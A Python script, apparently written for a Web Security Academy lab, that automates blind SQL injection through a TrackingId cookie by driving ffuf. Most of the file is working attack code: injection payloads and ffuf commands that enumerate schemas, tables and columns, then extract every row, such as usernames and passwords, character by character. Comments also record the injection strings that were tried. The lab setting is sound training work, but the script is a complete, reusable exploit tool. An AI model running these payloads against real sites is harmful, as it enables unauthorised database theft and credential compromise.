import requests
import os
import string
import json

url="https://0a1f009b03b199f5c0bed53f006e007c.web-security-academy.net/"
# vulnerable cookie
# cookies={'TrackingId':''}
exempt_db="'information_schema','pg_catalog'"

def setup():
    files=['numbers-0-to-50.txt','numbers-0-to-200.txt','chars.txt']
    check = all(item in os.listdir('.') for item in files)
    if check:
        print("========================   Setup already done!   ========================")
        return
    os.system('apt install ffuf 1>&- 2>&-')
    
    # numbers-0-to-50.txt (let [no. of db <=50] and [len(row/db_name/table_name/column_name)<=50])
    with open("numbers-0-to-50.txt", "w") as f:
        for i in range(0,51):
            f.write('%s\n' % i)
    # numbers-0-to-200.txt (let [no. of tables<=200])
    with open("numbers-0-to-200.txt", "w") as f:
        for i in range(0,201):
            f.write('%s\n' % i)
    # chars.txt
    with open("chars.txt", "w") as f:
        for i in string.printable:
            f.write('%s\n' % i)
    print("========================   Setup done!   ========================")

def get_req():
    r = requests.get(url ,cookies=cookies)
    # if response shows "Welcome back!" TrackingId exists.
    if "Welcome back!" in r.text:
        print("Welcome back!")
    else:
        print("Not Welcomed!")

def get_db():
    # some test cases :/
    # select length(group_concat(schema_name)) from information_schema.schemata where schema_name not in ('information_schema'); 
    # xyz' or (select length(group_concat(schema_name)) from information_schema.schemata where schema_name not in ('information_schema'))>1 -- - not working
    # xyz' or (select length(schema_name) from information_schema.schemata where schema_name!='information_schema' limit 1)>1-- - working
    # xyz' or (select length(schema_name) from information_schema.schemata where schema_name not in ('information_schema') limit 1)>1-- - working
    # 
    # first count total no. of databases 
    # select count(schema_name) from information_schema.schemata where schema_name not in ('information_schema');
    # xyz' or (select count(schema_name) from information_schema.schemata where schema_name not in ('information_schema'))>1-- - working
    # brute force: ()....)>2 gives not welcomed so no. of databases=2, meaning the limit offset to run is 2
    # ffuf -u url -b "TrackingId=xyz' or (select count(schema_name) from information_schema.schemata where schema_name not in ('information_schema'))=FUZZ-- -" -w numbers-0-to-50.txt -ac -s
    print("\n=========================================================================")
    print("========================    Getting Databases    ========================")
    print("=========================================================================")

    if not os.path.isfile('db_count.json'):
        wordlist="numbers-0-to-50.txt"
        payload=f"TrackingId=xyz' or (select count(schema_name) from information_schema.schemata where schema_name not in ({exempt_db}))=FUZZ-- -"
        print("\nUsing payload:",payload)
        cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist} -ac -of json -o db_count.json'
        print("Running ffuf:",cmd)
        os.popen(cmd).read()

    with open('db_count.json','r') as f:
        a=json.loads(f.read())
        db_count=a['results'][0]['input']['FUZZ']
    
    with open('db_count.txt','w') as f:
        for i in range(int(db_count)):
            f.write("%s\n" % str(i))
    print(".........................................................................")
    print("No. of Databases:",db_count)


    # finding length of each db name
    # select schema_name from information_schema.schemata where schema_name not in ('information_schema') offset 0 limit 1;
    # or select schema_name from information_schema.schemata where schema_name not in ('information_schema') limit 0,1; offset changes
    # getting length for the first row
    # xyz' or (select length(schema_name) from information_schema.schemata where schema_name not in ('information_schema') offset 0 limit 1 )>1-- - works
    # brute force length of first row, similar for every db name
    # ffuf -u url -b "TrackingId=xyz' or (select length(schema_name) from information_schema.schemata where schema_name not in ('information_schema') offset FUZZ1 limit 1)=FUZZ2-- -" -w db_count.txt:FUZZ1 -w numbers-0-to-50.txt:FUZZ2 -ac -s
    
    if not os.path.isfile('db_length.json'):
        wordlist1="db_count.txt"
        wordlist2="numbers-0-to-50.txt"
        payload=f"TrackingId=xyz' or (select length(schema_name) from information_schema.schemata where schema_name not in ({exempt_db}) limit 1 offset FUZZ1 )=FUZZ2-- -"
        print("\nUsing payload:",payload)
        cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist1}:FUZZ1 -w {wordlist2}:FUZZ2 -ac -of json -o db_length.json'
        print("Running ffuf:",cmd)
        os.popen(cmd).read()

    db_length={}
    with open('db_length.json','r') as f:
        a=json.loads(f.read())
        for i in range(int(db_count)):
            key=a['results'][i]['input']['FUZZ1']
            value=a['results'][i]['input']['FUZZ2']
            db_length[key]=value
    
    print("\nLength of Databases found!")
    max_db_length=0
    for key in db_length:
        print("DB:{} Length:{}".format(int(key)+1,db_length[key]))
        if int(db_length[key])>max_db_length:
            max_db_length = int(db_length[key])
    with open("db_length.txt",'w') as f:
        for i in range(1,max_db_length+1):
            f.write("%s\n"%i)

    # getting names for every DB
    # select substring((select schema_name from information_schema.schemata where schema_name!='information_schema' limit 1 offset 0),3,1) = 'm'
    # xyz' or substring((select schema_name from information_schema.schemata where schema_name!='information_schema' limit 1 offset 0),3,1) = 'm'-- -
    
    if not os.path.isfile('db_names.json'):
        wordlist1="db_count.txt"
        wordlist2="db_length.txt"
        wordlist3="chars.txt"
        payload=f"TrackingId=xyz' or substring((select schema_name from information_schema.schemata where schema_name not in ({exempt_db}) limit 1 offset FUZZ1),FUZZ2,1) = 'FUZZ3'-- -"
        print("\nUsing payload:",payload)
        cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist1}:FUZZ1 -w {wordlist2}:FUZZ2 -w {wordlist3}:FUZZ3 -ac -of json -o db_names.json'
        print("Running ffuf:",cmd)
        os.popen(cmd).read()

    db_names_temp={}
    for key in db_length:
            db_names_temp[key]=[None]*max_db_length

    with open('db_names.json','r') as f:
            ffuf_data=json.loads(f.read())
            for i in ffuf_data['results']:
                    params=i['input']
                    key=params['FUZZ1']
                    index=int(params['FUZZ2'])-1
                    char=params['FUZZ3']
                    db_names_temp[key][index]=char

    print("\nDatabases found!")
    db_names={}
    for key in db_names_temp:
        len=int(db_length[key])
        db=''.join(db_names_temp[key][0:len])
        db_names[key]=db
    for key in db_names:
        print(str(int(key)+1)+'.',db_names[key])
    print(".........................................................................")
    return db_names

def get_tables(db_names):
    print("\n=========================================================================")
    print("========================      Getting Tables     ========================")
    print("=========================================================================")
    all_tables_count={}
    all_tables_length={}
    all_tables_name={}

    for i in db_names:
        db_name=db_names[i]
        # count of tables in each database
        # select count(table_name) from information_schema.tables where table_schema='mysql';
        # xyz' or (select count(table_name) from information_schema.tables where table_schema='mysql')>1-- - works
        # ffuf -u url -b "TrackingId=xyz' or (select count(table_name) from information_schema.tables where table_schema='pg_catalog')=FUZZ-- -" -w numbers-0-to-200.txt -ac 
        if not os.path.isfile(f'{db_name}_tables_count.json'):
            wordlist="numbers-0-to-200.txt"
            payload=f"TrackingId=xyz' or (select count(table_name) from information_schema.tables where table_schema='{db_name}')=FUZZ-- -"
            print("\nUsing payload:",payload)
            cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist} -ac -of json -o {db_name}_tables_count.json'
            print("Running ffuf:",cmd)
            os.popen(cmd).read()

        with open(f'{db_name}_tables_count.json','r') as f:
            a=json.loads(f.read())
            all_tables_count[db_name]=a['results'][0]['input']['FUZZ']
        
        with open(f'{db_name}_tables_count.txt','w') as f:
            for i in range(int(all_tables_count[db_name])):
                f.write("%s\n" % str(i))
        print(".........................................................................")
        print(f"No. of tables in {db_name}:",all_tables_count[db_name])

        # get length of each table name in each db
        # xyz' or (select length(table_name) from information_schema.tables where table_schema='public' limit 1 offset 0 )=5-- - works
        # ffuf -u url -b "TrackingId=xyz' or (select length(table_name) from information_schema.tables where table_schema='public' limit 1 offset FUZZ1 )=FUZZ2-- -" -w public_tables_count.txt:FUZZ1 -w numbers-0-to-50.txt:FUZZ2 -ac
        if not os.path.isfile(f'{db_name}_tables_length.json'):
            wordlist1=f"{db_name}_tables_count.txt"
            wordlist2="numbers-0-to-50.txt"
            payload=f"TrackingId=xyz' or (select length(table_name) from information_schema.tables where table_schema='{db_name}' limit 1 offset FUZZ1 )=FUZZ2-- -"
            print("\nUsing payload:",payload)
            cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist1}:FUZZ1 -w {wordlist2}:FUZZ2 -ac -of json -o {db_name}_tables_length.json'
            print("Running ffuf:",cmd)
            os.popen(cmd).read()
        
        all_tables_length[db_name]={}
        with open(f'{db_name}_tables_length.json','r') as f:
            a=json.loads(f.read())
            for i in range(int(all_tables_count[db_name])):            
                table=a['results'][i]['input']['FUZZ1']
                length=a['results'][i]['input']['FUZZ2']
                all_tables_length[db_name][table]=length
        
        print(f"\nLength of tables in {db_name} found!")
        max_table_length=0
        for table in all_tables_length[db_name]:
            print("Table:{} Length:{}".format(int(table)+1,all_tables_length[db_name][table]))
            if int(all_tables_length[db_name][table])>max_table_length:
                max_table_length = int(all_tables_length[db_name][table])
        with open(f"{db_name}_tables_length.txt",'w') as f:
            for i in range(1,max_table_length+1):
                f.write("%s\n"%i)

        # getting names for every table in all
        # select substring((select table_name from information_schema.tables where table_schema='public' limit 1 offset 0),3,1) = 's'
        # xyz' or substring((select table_name from information_schema.tables where table_schema='public' limit 1 offset FUZZ1table),FUZZ2index,1) = 'FUZZ3char'-- -
        # ffuf -u url -b "TrackingId=xyz' or substring((select table_name from information_schema.tables where table_schema='public' limit 1 offset FUZZ1),FUZZ2,1) = 'FUZZ3'-- -" -w public_tables_count.txt:FUZZ1 -w public_tables_length.txt:FUZZ2 -w chars.txt:FUZZ3 -ac
        if not os.path.isfile(f'{db_name}_tables_name.json'):
            wordlist1=f"{db_name}_tables_count.txt"
            wordlist2=f"{db_name}_tables_length.txt"
            wordlist3="chars.txt"
            payload=f"TrackingId=xyz' or substring((select table_name from information_schema.tables where table_schema='{db_name}' limit 1 offset FUZZ1),FUZZ2,1) = 'FUZZ3'-- -"
            print("\nUsing payload:",payload)
            cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist1}:FUZZ1 -w {wordlist2}:FUZZ2 -w {wordlist3}:FUZZ3 -ac -of json -o {db_name}_tables_name.json'
            print("Running ffuf:",cmd)
            os.popen(cmd).read()

        tables_name_temp={}
        for table in all_tables_length[db_name]:
            tables_name_temp[table]=[None]*max_table_length
        
        with open(f'{db_name}_tables_name.json','r') as f:
                ffuf_data=json.loads(f.read())
                for i in ffuf_data['results']:
                        params=i['input']
                        key=params['FUZZ1']
                        index=int(params['FUZZ2'])-1
                        char=params['FUZZ3']
                        tables_name_temp[key][index]=char

        print(f"\nTables found for {db_name}!")
        db_tables_name={}
        for key in tables_name_temp:
            len=int(all_tables_length[db_name][key])
            db=''.join(tables_name_temp[key][0:len])
            db_tables_name[key]=db
        for key in db_tables_name:
            print(str(int(key)+1)+'.',db_tables_name[key])   
        all_tables_name[db_name]=db_tables_name
        print(".........................................................................")

    return all_tables_name

def get_columns(tables_name):
    print("\n=========================================================================")
    print("========================     Getting Columns     ========================")
    print("=========================================================================")
    all_columns_count={}
    all_columns_length={}
    all_columns_name={}

    for db in tables_name:
        table_columns_count=[]
        table_columns_length={}
        table_columns_name={}

        for key in tables_name[db]:
            table=tables_name[db][key]
            # get count of columns in every table in every db
            # select count(column_name) from information_schema.columns where table_schema="db" and table_name="table"
            # xyz' or (select count(column_name) from information_schema.columns where table_schema='public' and table_name='users')=2-- - works
            if not os.path.isfile(f'{db}_{table}_count.json'):
                wordlist="numbers-0-to-200.txt"
                payload=f"TrackingId=xyz' or (select count(column_name) from information_schema.columns where table_schema='{db}' and table_name='{table}')=FUZZ-- -"
                print("\nUsing payload:",payload)
                cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist} -ac -of json -o {db}_{table}_count.json'
                print("Running ffuf:",cmd)
                os.popen(cmd).read()  
            
            columns_count={}
            with open(f'{db}_{table}_count.json','r') as f:
                a=json.loads(f.read())
                columns_count[table]=a['results'][0]['input']['FUZZ']
            table_columns_count.append(columns_count)

            with open(f'{db}_{table}_count.txt','w') as f:
                for i in range(int(columns_count[table])):
                    f.write("%s\n" % str(i))
            print(".........................................................................")
            print(f"No. of columns in {db}.{table}:",columns_count[table])  


            # get length of every column in every table in every db
            # select length(column_name) from information_schema.columns where table_schema="db" and table_name="table"
            # xyz' or (select length(column_name) from information_schema.columns where table_schema='public' and table_name='users' limit 1 offset 0)>1-- - works
            if not os.path.isfile(f'{db}_{table}_length.json'):
                wordlist1=f"{db}_{table}_count.txt"
                wordlist2="numbers-0-to-50.txt"
                payload=f"TrackingId=xyz' or (select length(column_name) from information_schema.columns where table_schema='{db}' and table_name='{table}' limit 1 offset FUZZ1)=FUZZ2-- -"
                print("\nUsing payload:",payload)
                cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist1}:FUZZ1 -w {wordlist2}:FUZZ2 -ac -of json -o {db}_{table}_length.json'
                print("Running ffuf:",cmd)
                os.popen(cmd).read()
            
            column_length={}
            with open(f'{db}_{table}_length.json','r') as f:
                a=json.loads(f.read())
                for column_id in range(int(columns_count[table])):        
                    column=a['results'][column_id]['input']['FUZZ1']
                    length=a['results'][column_id]['input']['FUZZ2']
                    column_length[column]=length
            table_columns_length[table]=column_length

            print(f"\nLength of columns in {db}.{table} found!")
            max_column_length=0
            for column in column_length:
                print("Column:{} Length:{}".format(int(column)+1,column_length[column]))
                if int(column_length[column])>max_column_length:
                    max_column_length = int(column_length[column])
            with open(f"{db}_{table}_length.txt",'w') as f:
                for i in range(1,max_column_length+1):
                    f.write("%s\n"%i)


            # finding names for each column in every table in all db
            # select substring((select column_name from information_schema.columns where table_schema='db' and table_name='table' limit 1 offset 0),3,1) = 's'
            # xyz' or substring((select column_name from information_schema.columns where table_schema='public' and table_name='users' limit 1 offset 0),1,1) = 'u'-- -
            if not os.path.isfile(f'{db}_{table}_name.json'):
                wordlist1=f"{db}_{table}_count.txt"
                wordlist2=f"{db}_{table}_length.txt"
                wordlist3="chars.txt"
                payload=f"TrackingId=xyz' or substring((select column_name from information_schema.columns where table_schema='{db}' and table_name='{table}' limit 1 offset FUZZ1),FUZZ2,1) = 'FUZZ3'-- -"
                print("\nUsing payload:",payload)
                cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist1}:FUZZ1 -w {wordlist2}:FUZZ2 -w {wordlist3}:FUZZ3 -ac -of json -o {db}_{table}_name.json'
                print("Running ffuf:",cmd)
                os.popen(cmd).read()

            column_names_temp={}
            for column in column_length:
                column_names_temp[column]=[None]*max_column_length
            
            with open(f'{db}_{table}_name.json','r') as f:
                    ffuf_data=json.loads(f.read())
                    for i in ffuf_data['results']:
                            params=i['input']
                            key=params['FUZZ1']
                            index=int(params['FUZZ2'])-1
                            char=params['FUZZ3']
                            column_names_temp[key][index]=char

            print(f"\nColumns found for {db}.{table}!")
            column_names={}
            for key in column_names_temp:
                len=int(column_length[key])
                column=''.join(column_names_temp[key][0:len])
                column_names[key]=column
            table_columns_name[table]=column_names

            for key in column_names:
                print(str(int(key)+1)+'.',column_names[key])  
            print(".........................................................................")

        all_columns_count[db]=table_columns_count
        all_columns_length[db]=table_columns_length
        all_columns_name[db]=table_columns_name
    
    return all_columns_name

def get_data(columns_name):
    print("\n=========================================================================")
    print("========================       Getting Rows      ========================")
    print("=========================================================================")
    all_data_count={}
    all_data_length={}
    all_data_names={}
    for db in columns_name:
        db_data_count=[]
        db_data_length={}
        db_data_names={}

        for table in columns_name[db]:
            all_table_data_count={}
            table_data_count=[]
            table_data_length={}
            table_data_names={}
            
            for column_id in columns_name[db][table]:
                column=columns_name[db][table][column_id] 
                # get count of data rows in a table
                # select count(username) from public.users 
                # xyz' or (select count(username) from public.users)>1-- - works
                if not os.path.isfile(f'{db}_{table}_{column}_count.json'):
                    wordlist="numbers-0-to-200.txt"
                    payload=f"TrackingId=xyz' or (select count({column}) from {db}.{table})=FUZZ-- -"
                    print("\nUsing payload:",payload)
                    cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist} -ac -of json -o {db}_{table}_{column}_count.json'
                    print("Running ffuf:",cmd)
                    os.popen(cmd).read()
                
                column_data_count={}
                with open(f'{db}_{table}_{column}_count.json','r') as f:
                    a=json.loads(f.read())
                    column_data_count[column]=a['results'][0]['input']['FUZZ']
                table_data_count.append(column_data_count)
            
                with open(f'{db}_{table}_{column}_count.txt','w') as f:
                    for i in range(int(column_data_count[column])):
                        f.write("%s\n" % str(i))
                print(".........................................................................")
                print(f"No. of rows for column {column} in {db}.{table}:",column_data_count[column])  


                # get length of data rows in a table
                # select length(password) from public.users
                # xyz' or (select length(password) from public.users limit 1 offset 0)>1-- - works
                if not os.path.isfile(f'{db}_{table}_{column}_length.json'):
                    wordlist1=f"{db}_{table}_{column}_count.txt"
                    wordlist2="numbers-0-to-50.txt"
                    payload=f"TrackingId=xyz' or (select length({column}) from {db}.{table} limit 1 offset FUZZ1)=FUZZ2-- -"
                    print("\nUsing payload:",payload)
                    cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist1}:FUZZ1 -w {wordlist2}:FUZZ2 -ac -of json -o {db}_{table}_{column}_length.json'
                    print("Running ffuf:",cmd)
                    os.popen(cmd).read()                
                
                column_data_length={}
                with open(f'{db}_{table}_{column}_length.json','r') as f:
                    a=json.loads(f.read())
                    for i in range(int(column_data_count[column])):        
                        row=a['results'][i]['input']['FUZZ1']
                        length=a['results'][i]['input']['FUZZ2']
                        column_data_length[row]=length
                table_data_length[column]=column_data_length

                print(f"\nLength of data in column {column} in {db}.{table} found!")
                max_data_length=0
                for row in column_data_length:
                    print("Row:{} Length:{}".format(int(row)+1,column_data_length[row]))
                    if int(column_data_length[row])>max_data_length:
                        max_data_length = int(column_data_length[row])
                with open(f"{db}_{table}_{column}_length.txt",'w') as f:
                    for i in range(1,max_data_length+1):
                        f.write("%s\n"%i)
                
                # get column data for every table
                # select substring((select username from public.users limit 1 offset 0),1,1) = 'a'
                # xyz' or substring((select username from public.users limit 1 offset 0),1,1) = 'a'-- -  works
                if not os.path.isfile(f'{db}_{table}_{column}_name.json'):
                    wordlist1=f"{db}_{table}_{column}_count.txt"
                    wordlist2=f"{db}_{table}_{column}_length.txt"
                    wordlist3="chars.txt"
                    payload=f"TrackingId=xyz' or substring((select {column} from {db}.{table} limit 1 offset FUZZ1),FUZZ2,1) = 'FUZZ3'-- -"
                    print("\nUsing payload:",payload)
                    cmd = f'ffuf -u {url} -b "{payload}" -w {wordlist1}:FUZZ1 -w {wordlist2}:FUZZ2 -w {wordlist3}:FUZZ3 -ac -of json -o {db}_{table}_{column}_name.json'
                    print("Running ffuf:",cmd)
                    os.popen(cmd).read()

                row_names_temp={}
                for row in column_data_length:
                    row_names_temp[row]=[None]*max_data_length

                with open(f'{db}_{table}_{column}_name.json','r') as f:
                        ffuf_data=json.loads(f.read())
                        for i in ffuf_data['results']:
                            params=i['input']
                            key=params['FUZZ1']
                            index=int(params['FUZZ2'])-1
                            char=params['FUZZ3']
                            row_names_temp[key][index]=char

                print(f"\nData found for column {column} in {db}.{table}!")
                row_names={}
                for key in row_names_temp:
                    len=int(column_data_length[key])
                    data=''.join(row_names_temp[key][0:len])
                    row_names[key]=data
                table_data_names[column]=row_names

                for key in row_names:
                    print(str(int(key)+1)+'.',row_names[key]) 
                print(".........................................................................")
                ### end

            all_table_data_count[table]=table_data_count
            db_data_count.append(all_table_data_count)
            db_data_length[table]=table_data_length
            db_data_names[table]=table_data_names

        all_data_count[db]=db_data_count
        all_data_length[db]=db_data_length
        all_data_names[db]=db_data_names
    
    return all_data_names

setup()
#payload=input('Payload: ')
#cookies['TrackingId']=payload
#get_req()
db_names=get_db()
tables_name=get_tables(db_names)
columns_name=get_columns(tables_name)
data_dump=get_data(columns_name)

print("\n\n=========================================================================")
print("========================   Final database dump   ========================")
print("=========================================================================")
for db in data_dump:
    print(".........................................................................")
    print(f"Database {db}:\n")
    for table in data_dump[db]:
        print(f"Dumping {db}.{table}:")
        column_data=data_dump[db][table]
        all_columns=list(column_data.keys())
        no_of_columns=len(all_columns)

        first_column=list(column_data.keys())[0]
        first_column_values=data_dump[db][table][first_column]
        no_of_rows=len(first_column_values)

        for row in range(no_of_rows):
            for column in all_columns:
                row_data=data_dump[db][table][column][str(row)]
                print(f"{column}: {row_data}")
            print()
    print(".........................................................................")
print("========================   Final database dump   ========================\n")
